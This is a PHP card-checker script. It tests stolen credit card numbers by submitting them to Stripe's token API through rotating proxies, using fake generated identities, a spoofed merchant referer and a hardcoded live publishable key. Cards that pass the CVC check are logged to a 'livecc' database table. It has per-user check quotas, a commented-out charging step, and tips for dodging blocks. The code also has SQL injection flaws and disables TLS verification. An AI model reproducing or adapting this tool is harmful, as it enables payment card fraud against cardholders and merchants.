<?php 
include('dbcon.php');
include('session.php'); 

$result=mysqli_query($con, "select * from users where user_id='$session_id'")or die('Error In Session');
$row=mysqli_fetch_array($result);

$noofcheck =  $row['noofcheck']+1;
$id=$row['user_id'];
mysqli_query($con, "UPDATE users SET noofcheck='$noofcheck' WHERE user_id=$id");


if ($row['noofcheck']>$row['noofcheckallowed']){
	
	echo '<div class="alert alert-danger">';
    echo '<strong>#Reprovadas</strong>: Your account has reached the maximum cards to be checked.  - <strong>Papa P</strong>';
    echo '</div>';
	//echo "<script> alert('Your account has reached the maximum cards to be checked.  - Papa P');";
	//echo "window.location = 'checker.php';</script>";
	
}else{
	
////////////////////////////===[https://huntsvillefestival.ca/donate/]
/// Every thing is done Now ADD Proxies in Proxy.txt file and use

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$proxy = $_GET['proxy'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function binsforeveryoneproxys()
{
  $poxySocks = file("Proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}

function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@olxbg.cf';
}
$email = urlencode(emailGenerate());
$poxySocks4 = '149.28.41.235:3128';

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

$username = 'Put Zone Username Here';
$password = 'Put Zone Password Here';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens'); ////This may differ from site to site
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json', 
'accept-encoding: gzip, deflate, br',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/v3/GIQm89WqdPipo5cyACzNQ.html?distinct_id=89c220c1-8b49-f36e-bc92-3188a38daea4',
//// Referer is the most important thing 
////if api dead change referer
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));//// Always check sec
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2Fa44017d)&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+WOW64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F61.0.3163.79+Safari%2F537.36+Maxthon%2F5.2.7.5000&device_id=21129a58-5ae4-406a-b39d-87554ca88547&referrer=https%3A%2F%2Fwww.ed.org.nz%2Fpage%2F556429%2Fshopping%2Fcart%2Fbillpay-process.html&pasted_fields=number&time_checkout_opened=1586492597&time_checkout_loaded=1586492594&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]='.$name.'&time_on_page=47287&guid=a4628a6a-7fb0-483e-b77c-808ed04ee436&muid=c4540dbd-48a8-4b44-b287-416428289efa&sid=954da5ff-97e7-48f2-9e2a-1e179e9e27f8&key=pk_live_2F5UXELBwdnhtb03v4IJT1Ux0022USoGsG');
/// now replace cc number and details

//// use single quote and dot like  this '.xxxx.'
$result = curl_exec($ch);

// $token = trim(strip_tags(getStr($result,'"id": "','"')));

////////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

// $ch = curl_init();
// /////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// ////////=========Socks Proxy
// //curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
// curl_setopt($ch, CURLOPT_URL, '#');
// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//   'Host: '#',    [If No Host Data On Site Dont Uncomment It]  
//   'accept: '#',
//   'content-type: #',
//   'cookie: #',   [If No Cookie Data On Site Dont Uncomment It]
//   'Origin: #',
//   'referer: #',
//   'Sec-Fetch-Mode: #',
// ));
// curl_setopt($ch, CURLOPT_POSTFIELDS, '#');

// $result = curl_exec($ch);
// $message = trim(strip_tags(getStr($result,'"message":"','"'))); 

////////////////////////////===[Card Response]

/*$splited = explode(':',$proxy);

if($fp = fsockopen($splited[0],$splited[1],$errCode,$errStr,10)){   */

// If proxy worked 

$cvv = GetStr($result, '"cvc_check":', ',');
$code = GetStr($result, '"code":', ',');
$message = GetStr($result, '"message":', ',');
$dcode = GetStr($result, '"decline_code":', ',');

$cvvresponse = str_replace('"', '', $cvv);
$coderesponse = str_replace('"', '', $code);
$messageresponse = str_replace('"', '', $message);
$dcoderesponse = str_replace('"', '', $dcode);

if (strpos($result, '"cvc_check": "pass"')) {
   mysqli_query($con, "insert into livecc(Date, CC, Message)  values (now(), '$lista', '$cvvresponse')");
   echo '<div class="alert alert-success">';
   echo '<p align="justify"><strong>#Aprovada</strong>: ' . $lista . ' [Approved, cvc_check:'. $cvvresponse .']</p>';
   echo '</div>';
} elseif (strpos($result, '"code": "incorrect_cvc"')){
   mysqli_query($con, "insert into livecc(Date, CC, Message)  values (now(), '$lista', '$coderesponse')");
   echo '<div class="alert alert-success">';
   echo '<p align="justify"><strong>#Aprovada</strong>: ' . $lista . ' [Approved, code:'. $coderesponse .'] [Message: '.$messageresponse.']</p>';
   echo '</div>';
}elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<div class="alert alert-danger">';
 echo '<p align="justify"><strong>#Reprovadas</strong>: ' . $lista .' [Message: Your card was declided.] [Code: '. $cvvresponse .'] [Dcode:'. $dcoderesponse .']</p>';
 echo '</div>';	
}elseif (strpos($result, '"cvc_check": "unavailable"')) {
  echo '<div class="alert alert-danger">';
 echo '<p align="justify"><strong>#Reprovadas</strong>: ' . $lista .' [Message: Your card was declided.] [Code: '. $cvvresponse .'] [Dcode:'. $dcoderesponse .']</p>';
 echo '</div>';	
}
else {

 echo '<div class="alert alert-danger">';
 echo '<p align="justify"><strong>#Reprovadas</strong>: ' . $lista .' [Message: '.$messageresponse.'] [Code: '. $coderesponse .'] [Dcode:'. $dcoderesponse .']</p>';
 echo '</div>';	
}

/*}else{
  echo '<div class="alert alert-danger">';
  echo '<p align="justify"><strong>#Reprovadas</strong>: ' . $lista . ' [Message: '.$errStr.'][Code: '.$errCode.']</p>';
  echo '</div>';
	
}

//echo '#rCredits '. $noofcheck;
fclose($fp);*/

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
//echo $result 

///////////////////////////////////////////////===========================Edited By Reboot13================================================\\\\\\\\\\\\\\\
}
?>
